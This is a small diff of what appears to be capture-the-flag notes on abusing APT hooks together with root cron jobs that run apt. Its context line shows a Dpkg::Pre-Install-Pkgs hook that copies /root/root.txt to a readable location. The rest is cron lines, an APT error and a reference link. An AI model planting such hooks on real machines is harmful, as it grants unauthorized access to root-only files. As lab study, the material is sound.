@@ -203,10 +203,12 @@ Dpkg::Pre-Install-Pkgs {"cat /root/root.txt > /root/.ssh/kikka.txt"; "chmod a+r 
 
 */5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
 30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
-```
+
 
 E: Problem executing scripts APT::Update::Post-Invoke-Success 'test -x /usr/bin/apt-show-versions || exit 0 ; apt-show-versions -i'
-https://unix.stackexchange.com/questions/226993/whats-the-difference-between-dpkgpost-invoke-and-dpkgpost-invoke-success
+```
+
+Hmm. https://unix.stackexchange.com/questions/226993/whats-the-difference-between-dpkgpost-invoke-and-dpkgpost-invoke-success
 
 APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).
 
